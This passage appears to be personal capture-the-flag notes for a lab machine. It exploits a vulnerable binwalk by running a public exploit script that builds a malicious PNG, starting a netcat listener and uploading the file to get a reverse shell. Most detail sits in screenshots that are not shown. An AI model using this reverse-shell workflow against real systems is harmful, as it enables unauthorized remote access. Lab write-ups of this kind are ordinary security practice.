
malware scan? Lets check
![[Pasted image 20231108091526.png]]
![[Pasted image 20231108092027.png]]

after some digging i found that binwalk was vulnerable
![[Pasted image 20231108092516.png]]
![[Pasted image 20231108092537.png]]

so lets use exploit
![[Pasted image 20231108094155.png]]
```
python3 51249.py Untitled.png 10.10.14.148 1234
```

it creates binwalk_exploit.png

start listener
```
nc -lnvp 1234 
```

upload binwalk_exploit.png to /var/www/pilgrimage.htb/shrunk
![[Pasted image 20231108094715.png]]

and BOOM!
![[Pasted image 20231108094754.png]]
